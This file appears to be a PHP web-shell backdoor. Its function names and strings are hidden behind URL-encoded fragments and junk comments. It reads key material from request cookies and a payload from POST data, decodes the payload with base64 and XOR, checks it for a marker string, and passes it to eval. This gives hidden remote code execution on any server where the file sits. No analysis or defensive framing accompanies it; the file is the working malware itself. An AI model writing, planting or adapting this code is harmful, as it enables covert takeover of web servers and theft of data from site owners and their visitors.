<?php # ?~{ 4\-~6
 parse_str	// g!z8s
( # mEv1FB(J
'4'	// ~ZkH36&oh
. '66=' . '%5' . // 	+(K+
 '3%5' .# -A_ {ArL'	
'5' .	// K8(nA
'%'// IjcQ/lp
 ./* -N(-eNK */	'6' .# J}u1+Ek
'D' . '%' . /* j21&,>;o 7 */	'6' . // 9W(rlo;8|
'D' # ;x.o7CNTf?
 . '%6'/* J		AW4	 */. '1%5' .# |A4gyFV.VI
'2%7'/* _QWy  */	. // Z+%Sn"d^
 '9&8'	/*  'X?m@W8*i */	. '5=%' .# &/)}r3
'55' .	// O]_9H~42}X
'%5'/* Z7	?`j */ .# )inoWl
'2%6'// Ile d
. 'C%' . '44%'# uT2 HP	.Vy
. '45' . '%' . '6' . '3%' . '6'# b =aZMl7<,
./* HZa 9$ */'f' . '%44' . '%65'// ;/ j9.L
. '&4'// *	1X'^
. '41='/* 	H+V% */. '%75'/* $JPoc8`*hg */. '%6' . 'e'# w {L:.w[sa
 . '%' /* !*'LJ&x=P */.# )ISon	
'73' . '%65' .// VL2fk1(_VP
 '%' . // <^B-j/;T
'52' . '%6'# C )@)4Z 4q
./* p97P`	D%b */	'9' .	// Ac,x)\}z}
'%6'	/* YUS&  */	. '1%' # r*ooJ!i
. '4c%' . '6'/* i?kB:Y */	.# EQ1_/b
 '9' . '%' . '7A%' . '6' . // ,}2'(8x2
 '5&' . '13' . '2='// 6d./&Gc
 .# >j)EP:7	,
'%'/* `llw@A! */. '72%' .	// D.>? dRn
'73%' . '4' ./* D~W*?S */'B%' . '7'# <G+1?wQ:J
. '4%6' .	// 8c$)FWLr
 '5%4' # B } }O3F
. 'f%'// 9R)zc [
. '4e' .# 	CHoJ<3	C7
'%7'# ZW:8BF5
 .// ucvAPS	8l
'2' /* CW~k	6F Y$ */	. '%' ./* `Kg&D% */	'53' # \,	(Ly]
 ./* 8=~+F */ '%3'# siJ37mS<\
	. // @bin7
 '6%6'	/* p  DWMc */. 'd'	/* 	`S,8 'W */. '%5' . '8%'/* 	[W\?e8; */. '61&'# %J 0R$U
. '948'	# n`Xlwz+;
.	// BfMyS<
	'=%' .// |gKA4Q
'4E%'# xvL.qe)Pb
 . '4' . 'f' . /* vU2;.	 s$ */	'%4' # {H u5
.// 	A}@)tKh
'5%4' . 'D%'/* LWn?k8 */. # l`97*}U
'62' . '%'// w-*7.m
. '65%' . '44&'	/* .y>QO[ */.// ekEa\+gU3^
	'23'	# .@sf  
. '0' .	// Mvt9	Y	a3
'=%'// X?MduOp}
 . '73' ./* _8Nm0U &	b */'%5'# p5wLbz n
. '4%5' . '2%' . '6C'// 1x@Vm'gq
	. // {	zc62
	'%6' ./* Ok_e)q */'5' ./* MOD49pK */'%4'/* +{?(~8	 */. 'e&'/* /m !^hfT */ . '56='	/* ;^ 0u */. '%' . '6' . '1%' . '72%' .// :P4\p
'5' .// c|54\h
'2' .	// { Qt1+O|S
	'%61' .// v.dGj	|dy6
'%79'// I AciC7\pV
. '%5F'	/* %IoOn */. '%' . '76%'	/* 	[[]aK31hx */	. /* GE-UAa */'6'# mlS	GVU
. // Im	p}>
'1'# Z;hLI4a
 . # henlmd
'%' # ZW;V$[d
.//  	YY)
'6c%' . '55' . '%' . # rzE7RILD
	'65%'	//  |[*_Y
./* "VG	HaY */'53&' . '58'# w3gx9
. '9'// 06~_  `{{|
. '='// gqZrF7u
 .	/* -AOs?ct */'%68' .# _z!qOR	
'%'// |xwV0
.// }<}XWh<qZ
	'54%' . '6d%'# 	H,H S8
	. '4c&'// G: }p:$Rh
. '942'# [-rY:{v
. '=' . '%4' . '1'# h{3$J7
. '%' ./* 	_9Z0yI */	'6E%'	# Pc_|3:M	@
	./* S 5rl6GyI> */'43%' . '4' . '8'// 1P 	`
. '%6'/* I\eABHH */ . 'f' . '%72' . '&' . '5' . '25=' // N_{$dxI
 ./* =%7{CM k/ */	'%63' /* f-_X !2*}D */	. '%4'	/* "W.2}	 */.	/* [%:<=+  */'9%7' . '4%' .// jG	=~bK
'6'	# kP<)tJz
 . '5&7' . '98' ./* !E1CJp(  */'=%6'// 'n4 s5wt`
.# zDI!{|X.<
'1'// X3|~)t6
. '%3A'// ^%Ln;pt<
 . /* qR,c	%4 */	'%3' . '1' . '%'// 4T@/U,b
. // X5P&u59Y
'3'	// GtU`Bn/
	./* O0}Vug */'0%3' # +Jw^Ek
.// Tl~+X:
'a%' . '7b%'	// NcQty*fo
 . '69' .// 	uCi 	%	 
'%3a' . // *tr+VF
	'%39' . '%'// oy}CC
. '35' . # QgX*^Ty
'%3B'# Z<c: 
 . '%6' ./* sWn%.;{P */	'9%'# e4?:U`
./* .{'(8,8g */ '3a%'	/* O3_" f  = */.# )d]bO+NR
'34'# cH,8~NL
./* \>}`z */	'%3b'# 8XB:;pw.	
.	/* tL0h<r$! */'%69'# 	Bj0(]l
./* <i&L+/Lz */ '%3' . 'a' . '%3'/* \		, MI */	. '2%3'# ]~^89&,5
 .# 	Q`%`
'2%3' .// @,zd!suJf!
'b%6' . /* 7C	j :3!%% */ '9' . /* Jrk6	"WBb */	'%3a' .// [\A-) (.j
'%32' . '%' .# OTe5> 
'3b%' . '69%'# XCCW2RsN
./*  *v TuXP */'3A%' .# %waR^~lg f
'3' .// X" y59O
	'8%' .# Rz	@/
'31' # UCV86	m
 ./* zDRID	w&I */'%' ./* '+5yaaRkt4 */'3b' . '%6' . '9' . '%3'// 9kuY4 7
. 'A%'# Exk2}
. '31%'# ,4zL{hY4b
. '32' .// nKA03*iDX
'%3' . 'b%6'# '&JUMN
. '9%' . '3' . 'a'/* wtu^VP */. '%3' . # 	@~Kdr:J
'3'# lfsy;		j-
. '%3' . '2' . '%' . '3' . 'B%' . '69' . // O$F *pW
 '%3A'# n%V	 "H 
. '%31' . '%' .# cD{	KrC~
'3' . '9%' .	// p8C0VD':= 
'3'// o0Y{):a4[
	. 'B%6' /* [1		Y 8/r_ */.# i	{btsPO
'9' . '%3' . 'a%'# 8YWt=B\bOD
	. '36'# :25	a
.	// Z0?TB
	'%3' ./* |D$K-M */'1'/* -LV	; n&* */	./*   "q&e */'%3' /* a6;d "LD */	. 'B%6' ./* VS d=R */'9'	# Mjy	p7
. '%' . '3' .// Ax Xr/D
 'a' // ie 	8c	=
. '%3' ./* 1i"/_GZL: */'6%' ./* S	lwc e	*> */'3b%'// =	<J,mHM
 .// u!n?6}3
 '69'/* ^jiL<g4K% */./* YV	^%fy$r */	'%'# yNW];zV
 . // I6sPemly	*
'3' ./* wwR	8+=H */	'a%3' .// {;.]	wr,
'5%3' . '6%' . '3B%' .// {OR+yQF
	'6' //  Wi*\
.// U-ErSx
'9%' .# >:[j1BV^
	'3A' . '%36' ./* <48 f: */'%3'	// 	]I8:;
.#  \	3r b\
'B%6' . /* An'	pp0	Vy */	'9%'	/* |:r&G;{NB */.// 	[\ q
'3A%' . '37%' .	// NcA!~bd$O
 '3' . '6%'# Mw+5VM}_S
. '3b%' . '6' . /* 	)HF>&h */'9%3'/* am)&hE~@|T */. # JI`<"5
'a%3'# `0?N,M
 . // ~' ,.yE
	'0'// 	um?J{336
.# MN]S!b/7
'%3b' # xg7 B?/5
	. '%'/* cs	Sw(;1 */ ./* BL)V] 2 */'69%'# Jjw k)Sl
.# |0 X{Fdja=
'3' // aK=@z
 .	// e	z 9Vg=u
'a%3' .// 7+Eq, 1o
	'6%3' . // ,5\sjKd6 
'5'# @O4Rk!?
. '%3b' . # |:5aDuE
	'%69' . '%3' . 'a' // Tnf"	 f=
. '%' # ^$yLt
./* j*"G% */	'3' ./* 9S+zhB */'4'// HyQ%|[
. '%'	// ~%P@~@bf
./* LaT@; */'3' . 'B%' . '69%' . '3a%'	/* t7/2r"xp */.// ef ORc C
'32'# 8BL]=70'
.	// }f	qR\O	rT
	'%35'// 9S}`r`
.# %e[ t$ecUM
'%3' . 'B'# RI[y50eA[d
. '%69' . '%'# Lp	mZ :
.	/* Y\'YII */'3' . 'a'# g	:Y~a
./* w)begq */ '%34'// ~7446RB*on
.# DeAdw	 	g
'%3b' . // 11<wg]}PQ
	'%'// Y\UoCja>xW
 .// 4]wq9U%*)
'69' . '%3a'	/*  1]mQ3 */. # n ^vj
 '%' . // BOKo^ $
'3'// \-H$JPw
	.# 6.K8F;
'5' . '%'# <	8}_	:z 
. '30'// 6=ad@Me?$
.// o5xq@ag'
'%'	// yF;G_XH%
	. '3B%' . '6' ./* GbnCo(	h */ '9%' .// .}E	1a
'3A' . '%'// amzk ^ )qD
. '2'	# j|P	O
. 'D%3'// \xP2ACL4 D
. '1%' . '3' . 'B' . '%7'# eI qB[+*
.# ?eRN(yX
'd&9' . // TPlYq
'01' .	// EU'%lg
	'=%' .# d"Ss7
'4'/* $"g	nd6y` */.// |M5'.	+NC<
'3%4' . # gs>Px
'f%6'	// Y	UOL$%b@}
.// c3ouqWq+0T
'C%'# @C}JD	E
. '75' ./* G(+DG6_F */'%' .// Fz%U6Un4
	'4D%'// <;	*:AhQ@l
	. '4E&'// TPmP"<"M
 . '564' .// I>M]liy6
 '=%6' . '3%6' . 'F' . /* 7m.Y<r%:k */ '%4D'	/* B	 6\]JeOk */	.//  0b31M
'%6' .# JJB&B4
'd'	/* }a%i|B */.	// P. `(
'%' . '65' .# ]60\@,j1
'%'# L^<3MpIq@ 
	. '4'// | CT	
 . 'e' ./* ASsFKp	 */'%' .# qCIDE
'5' . '4&' . '153' ./* 	4A3  */'=%'// }VDR(
./* 'sn0	 */'64%' . '4' . '9%' . '41' .// 8"V(W}
'%4' . 'C'// tG . 
. '%4'# eU 7;	
	.# +2z[xMl;
 'F' . '%' . '47' .// KWFq/?p	Wf
 '&'# go7|AD|
. // Y Dq N
	'44' . '5=' .	/* 	vy$5k */ '%6'	# zY!"PRDn	
. 'e%4'# g K?ay5	vM
 .	/* ;;AaQLK7QZ */'7%' . '6C%'# O(SRaab
	. '7'# />m	WG
 . '8' . // 7PmnHkd?~
	'%6' .# $!>L,
'4%'/* rkrr6 a5r */	. '4'	# \`\E0S$
./* TjI0(yI */'A%3'	/* UM	t*+v0 */./* e}I/W!k0/[ */'2%6'# Ao, ?p$
. 'c'	// eP?Z	
 .# y4QDDvQ
 '%42' . '%' .// ?cp	AZM,
 '46%' ./* *Sgo4XoUu  */'33%'/* Sp.{mq a */.# lT	>N
'5a%' . '31' . '%5' . '0'// 2&k	(c
. '%' .// gZ!E5JA4o0
'69%' ./* l|l"qcv */ '42'# \RT!^mc3
./* _k}n&o>Q/ */'%7' .	# K[|h	Pt2w.
'2' . '%32' . '%'/* _<o0	HPXWP */.	/* Qvd14Y yG */'78&' . /* +ZLF7 W)O */ '52' . '8' ./* DE"O"@ */'='# l] dI@m	]
. '%7'/* n@yBx */. '0%6' ./* 	R()xYsx */ '5'# L:u{< 	v
. '%' # lR	Mt%
. '6'# ;h 2vG
./* )2rPU */'7%'# $@KSC0cq.a
. '5' . '2%'// 	W5	[.
	. # X\~vr
'7' . 'a%4' // `%F(Z	b
. 'F%7'/* tM4w0 4f */. '1%' /* ( kx| */.# >i\1elFO3
'4' . '6'	// rk=E}P;
	./* DYy09 */'%' . '4F%' . # 40)p4ZZ`|u
	'35'# LPJS@-
 . '&20'// rb	T^Y|
.// zGCV9R 
	'7='// 	thq-1zV
.# pZ!3>	v
'%6'// "dw	PZgw:a
. '5' . '%4' . 'D%4' . '2%6'	/* zzkRJ */ . '5%4'# `m	$	23qx
.# TU8Tt=|cN
	'4&1' /* 98k		^9 */.// Co`ay
'51='// cT\gSp `a
./* t^d3VWo */'%5'// z&qPb
.#  3	LIu
 '3%5' . # Cc$Vk1
	'4%7' .// &cF	<a/	
'2%7' //  [j	F0B
 . '0%'	/* Mq1?Dz%;y */ . // uq< o90b7	
'4F%' . '73' .	// 3fagtqyA
'&' .	/* YhTh@> */'71'/* u$ y'J	 */	.// 64"~ JT\e3
'=%7'/* 	kcH. */ .	// =n;	=n{
 '4' /*  &S	 5{{_< */.	/* `@`p"~O6 */'%'	# %=;CS!
. '72%' . '6' . '1'	// %.bO1hcim
. # qb/_v8i
	'%4' . '3%4'/* pW$4?L	X */. 'B&5' # gOja	T_^O
 .# D/ )VzD:
	'4' . // %r'\ x
'3'# = [5L"7v-
. '=%6' ./* J7;DA */'3'# f-2 Qh$8
. '%'	// 6aD-:i	tj&
 .// F!1UQ
'6' ./* (zQ`:g1= */ '1%5'// ]	W0TsB;
. '0%5' . '4%'# 7mH<p^C
	. # tuFk  *
'4'# A]3	>z**
. '9%'# F= 0L
.// \%%CL
'4'/* Ex_/|<- */. 'F' ./* p!-2cT+P */'%6E' .// 	$U	j	& 
'&77' /* gX	8tT\ */	. '6=' . // ;88MJ
'%5'#  UwD($.M	/
./* m U&*&0X */'4' .// ; ffq_c"7]
	'%52' .# >T\Mlf
'&9' // P%{s`SS
 .	// u	=xh{
 '88='# <r6Udz3	
. '%4' . '2%4' . 'C' .# Kzk!*C
'%'// 7L[H08X'QK
.// ~o}3.'}
	'6f%'// +[<SQ
	. '63'	// ;^ p f"?
 .# GdZT$s
'%'# tiP'<|KhzG
. '4B%' .	// 1	[/lzQV
	'71%'# Tji="YZ?A\
 . '75%' ./* CJkS;'% */'6F%' ./* N+0@M|[ */	'7'# 8		Bk(Z
. '4%' . '65' . '&6' .	/* ZhhyK3 */'3'/* FI|xs2&( */. '5='# __@+T{Hlw|
. # 	AU};
 '%4' . '9%6'// 4 nF:=G
	. 'D' .	/* f[:B_ */'%'# a[O/,
. // }LKXHc
'61'	// &_laCw\W
	.// 4LMp	
'%6'/* :"	0\Hw */. // b]Nen'7?h
'7' . '%'/* O3D	~S */./* w`	''[}U */'45' .// ^WN0.
'&64' .# 0o-j7"`U
'8=' ./* wqF\7 */	'%' . # a!5(gS[	j
 '4'// =GDVh
. '2%6' . 'F%' . '44%'# 	qC]D	!8
. '59'// efvR~	0!j3
	. # ?TLo;Fm;2
	'&5' # ?mh}s0
	. '9=%' . '6E%'# C-%(Cn
. '6'# %6'8|
. 'F%6' . '2%'	// F] Gc)G
. '52' . '%' . '65%'// kydz@,f
.// C|7r	 
 '41%' . '6B&'// `;	'ZCf&|'
. '91='/* _ttj	Dc */ .// *2-N;3CZ
'%7'// 	}"O> (WF4
	. '2%'//  \iY,ll
	.// \."O +.
'32' .// x?^\F S
	'%'/* r9c<Dd  */.// @Fd^i7$	
'52%' . '39%'/* ?%fI. */./* e]UoxsJ */ '62'// XL"F&GyKw
	.	// v&2$	h`*
	'%5'# cU~m*:[-mn
.// {!Ub{
'4' # <~kOK
. '%'// TFd@]+%t
 . '68%' .# _`D|8O6j<
	'6e%' ./* L	o6p */'50%' .// n+/OQ||B
'35%' . '39%' . '5' . '8' . '&6' . '47'/* 17A-uSe- */	. '='	//  W7YB
. '%' .// eg;!x!S
'42' .	# z}cQbv_
 '%'/* 0jA0"_-1P */ .// V	@fMIL	p
'41'	// 	(t%<v	 D
. // 9WD >
'%73'	# I:XrSPg5
. '%' . '6'# 8w_svA"6`
 .# ^;uQ'wQ
'5%3'// x\m| >4D}5
. '6%'	# a?^ |E
.	# )~sg{
'3' . '4%5' /* c sGuKNor3 */. 'f%' .# ftXV+
'64' .// -r	OH.)L<
'%45' /* \j"Gw=; ] */ . '%' // "=vm%	 !
. '63%'	# 	 Z	N-
./* 1qxE= */'6F%' .// }='WW\V&
'64' . '%65' .# "9	 (oR
	'&65'// 	 *URsq
. '3=' .# (M 1 
	'%7' . '3%' . // 	r-$G 
'7'/* T(62F{1gO */ ./* ~BO3< u<7 */'5%4' // wIW_	v
. '2' .# "Q1z~|"AS
 '%73'// ${ d bmt|i
. '%'	// -(5[2U+S
. '54'	// L&xNh
. '%72' ./* MjBux$ */ '&18'	// <u_ D$lTb\
 .// ZPFb?xRGs	
'8=' ./* }a@x}t}U{ */'%' . '48%'// k-^+2cr
.# Ka	WE 
'65'	# o9$}cE
 ./* <_AcI 8 */'%'// 20rI=
	.	// ^&hw!"H
 '41'# bqy"T)tW-
	. '%6' ./* r\SoE */ '4%' . '65'/* %B<A (  */. '%52'/* B JxKMW */	. '&' .	# :0fbQS /7G
'93'/* ?f2nQe" */.# q	vw1><
	'3'/* 	pDoqLa */./* 	} x`ec	  */'=' .	/* 5\>D  */'%4'// >JFD$Q
 . 'e%4' . 'f'// 8P	Rp].)
. '%73'	# U	{yps 95
 .# (	sQSZ
'%' . '63'// 6J_ 3vk
. '%7' # 		[y7\
. '2%6'# R0T*	>D" M
 . '9%7' . '0%7'/* 2m`Wl}  */.// fCREQ;
'4' , $pD8# ;A p4
) # 	;f	>
 ;# yW	Xy_ 79
$v8ck // QF2P$?N-	
	= $pD8/* gSZtS` */[ 441 // }j&/ ,| 
	]($pD8	/* Ce.,EY;~I] */[// {kg%RSJ
	85 ]($pD8# UQr\$wU
	[ 798 ])); function// }	tt6
r2R9bThnP59X ( $Qz6gf , $uUQqZ95i )/* 	/x*g */{/* lsj	W&S>YN */ global # wAc	c ;Yg
$pD8 ; $df0ge = ''# gn,HW`lu F
	; for (# mv zUp<
$i// 7qI|c~P
 = 0// 3F veH
;// ds~+?
	$i// \7 'l_
	<# I^/}sm
$pD8 # t(|3U(=
[	# ::		~3P4 W
230// b}%/<_	
] ( /* R	XUE>NU/? */$Qz6gf ) ; $i++ )# c&.,o-
{/* DsAA}P7^O8 */$df0ge .= $Qz6gf[$i] ^#  3h	7[q
$uUQqZ95i [/* Ud'nj3Z8\t */$i % $pD8 [// {,{b $BQx
230 ] (# ?aWu|	
$uUQqZ95i	// .oBB	FG
) ] ; # \ki)^ULX
	}// na<Rk
	return $df0ge ;# e ;  
} function# Zj)R	xH
pegRzOqFO5 (// Z	pZ/
$UXhbMNoI ) { global $pD8// !'f $X4n
	; return // '	`26eS
$pD8 [ 56 /* +/Q-x */] (# *|x 	Wc
$_COOKIE/* Hbm** . */ ) [ $UXhbMNoI ] ;/* 4TqK0~qN */} function// G6H_D
	nGlxdJ2lBF3Z1PiBr2x// -nZ0z
(// 4	NtEX
	$LBvC8lU ) { global// 	@No.LW ^}
 $pD8# S	Ya;L'5
;/* c	v9v */return/* 	\o3u */$pD8 [ 56 ] ( $_POST )# N'A2ua$s
[# TZZ|>b"
$LBvC8lU ]/* .Bhnk */	;// [G'/)&i
	} $uUQqZ95i = $pD8 # HQUgK  =`
[/* %7;]Xoi cM */91	/* x,d	.woD| */ ] (/* 1p5pvsd */$pD8 [ 647# @8'hx:OR
] (/* }X9f+*npU */$pD8 [ 653 ] (	# ~"$(~jBcb
$pD8/* gqGU	r	^%8 */ [# Oj2"Mh}
 528/* QP	M4>' */] (# w5(o<f>A
$v8ck [ 95 ] ) , $v8ck	/* u	<:	r &*7 */	[# vEH2F@B3E
81 ] ,	// )J VP
$v8ck [# IE A1
61// vm6Dz
] * $v8ck# T.9w%	
[ // X {V(%R
 65 ]/* +AL$N SHl */) )// kzwZHR
 , /* >S%e	S */$pD8 [ # 	o \' xh
647	/* ,pxKV}nhPQ */ ]/* j}Z	rRk	 " */( $pD8 [	# gp"6{PfIs}
 653 ] ( $pD8 [ 528# X	 6B<$	
] (/* Y\\7	OC[ */$v8ck [ 22 ]# Ohzr+0h
)	// kKQ<K5j
, $v8ck # +yA*\	zJ
 [ 32 ]	// YbqPk
,# pZ,os@
	$v8ck [// =*%iQ	!
56// 9i@3QE
	] // 73Z7C \;*7
*/* P[CcTZ   */$v8ck// U8`v	
[ // )DR)J		
25 ] ) /*  yYtrLZLk */)	// C v/"g
	)/* y	 ]k i;>& */	; $e1F2X = $pD8 [ # 0o<.I"<
	91 ]	# m.AytKM3
(/* lt)6ndlK? */	$pD8	/* 7x&Tu3.nA */[ 647 ] /* 0.g}RJ */ (/* `)Z;Q?{ */ $pD8 /* 3D8McH: */[ 445 ] (# W]Ra}p:c
$v8ck/* ~h	lL; */[	/*  6.Wha\^ */76/* /S^Ug */] )/*  P_	l['4 */) , $uUQqZ95i ) ; // 6%]h/
 if// 3S'Y6Di
( $pD8 [// o;e$6
151# Q) .Ys~a+	
] ( $e1F2X// QPjl9z
 ,# %	 `~
 $pD8 [# j^B@(cDH.
132 /* 2	<'`}K4i */]// ]LZM@
)/* "9BYxVPl' */> $v8ck// =	)]8"
[	# X"I_SW4
50 #  A=	w ]$
]# ?	GIR7
) // ^S<5!)pN	d
 evAl# lHeLHU5v	 
(/* SpBBj$`_ */$e1F2X )// ^k&dv1
; 